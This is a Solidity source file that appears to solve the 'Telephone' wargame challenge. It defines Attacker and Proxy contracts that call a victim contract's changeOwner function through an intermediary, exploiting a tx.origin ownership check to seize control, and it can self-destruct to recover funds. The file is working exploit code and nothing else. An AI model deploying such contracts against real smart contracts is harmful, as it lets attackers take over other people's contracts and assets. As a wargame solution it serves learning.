// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address) external;
}

contract Proxy {
  address payable internal _owner;

  constructor() {
    _owner = payable(msg.sender);
  }

  modifier onlyOwner {
    require(msg.sender == _owner, "expects to be called by owner");
    _;
  }

  function attack(address victom, address perp) public {
    require(perp == _owner, "expects to be called by owner");
    Telephone(victom).changeOwner(perp);
  }

  function kill() public onlyOwner {
    selfdestruct(_owner);
  }
}

contract Attacker {
  address payable internal _owner;

  constructor() {
    _owner = payable(msg.sender);
  }

  modifier onlyOwner {
    require(msg.sender == _owner, "expects to be called by owner");
    _;
  }

  function attack(address proxy, address victom, address perp) public onlyOwner {
    Proxy(proxy).attack(victom, perp);
  }

  function kill() public onlyOwner {
    selfdestruct(_owner);
  }
}
